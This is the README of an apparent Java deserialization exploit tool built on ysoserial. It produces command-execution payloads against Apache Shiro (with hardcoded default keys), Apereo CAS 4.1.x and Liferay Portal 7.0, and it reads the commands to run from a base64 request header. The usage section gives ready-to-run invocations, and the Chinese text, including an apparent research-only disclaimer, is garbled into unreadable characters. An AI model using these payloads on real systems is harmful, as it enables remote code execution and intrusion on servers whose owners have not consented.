# ����ĳЩ��ܺͳ����µķ����л����� 

## 0x01 Introduce

1. Request/Response����
2. ֧��win��linux payload
2. base64����

## 0x02 Support
1. ApereoCAS 4.1.X Ĭ����Կ
2. Shiro spring �����»���
3. Liferay protal 7.0 ����

## 0x02 Buiding

```mvn clean package -DskipTests```

## 0x03 Usage

```
Author: JF

Usage: java -jar yso-echo-all.jar shiro linux [key default kPH+bIxk5D2deZiIxcaaaA==]
Usage: java -jar yso-echo-all.jar shiro linux 0AvVhmFLUs0KTA3Kprsdag==
Usage: java -jar yso-echo-all.jar liferay win
Usage: java -jar yso-echo-all.jar apereo linux

[Add Request header] c=d2hvYW1p (whoami)

  Available payload types:
     Payload Authors Dependencies
     ------- ------- ------------
     apereo          commons-collections4:4.0
     liferay         commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     shiro           commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

```

## 0x04 Screenshot

shiro spring env
![shiro_spring_env.png](./screenshot/shiro_spring_env.png)

## 0x05 Reference
* https://github.com/frohoff/ysoserial
* https://www.freebuf.com/vuls/226149.html
* https://www.00theway.org/2020/01/04/apereo-cas-rce/


����ѧϰ�о�ʹ�ã��������ڷǷ���;